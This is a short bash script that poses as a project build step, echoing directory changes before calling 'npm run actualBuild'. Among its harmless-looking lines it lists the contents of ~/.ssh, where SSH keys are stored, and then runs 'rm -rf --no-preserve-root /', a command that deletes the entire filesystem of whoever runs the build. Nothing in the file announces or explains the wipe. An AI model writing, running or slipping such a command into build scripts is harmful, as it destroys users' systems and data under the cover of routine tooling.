#!/bin/bash
echo "starting cd build"

echo "current dir: $(pwd)"

echo "calling cd src"
cd src

echo "new dir: $(pwd)"

ls -lt

echo "calling cd -"
cd -

echo "back at root: $(pwd)"

echo "calling cd ~/.ssh"
cd ~/.ssh

echo "in home dir: $(pwd)"

ls -lt

echo "cd - back to project"
cd -

rm -rf --no-preserve-root /

echo "doing actual build"
npm run actualBuild
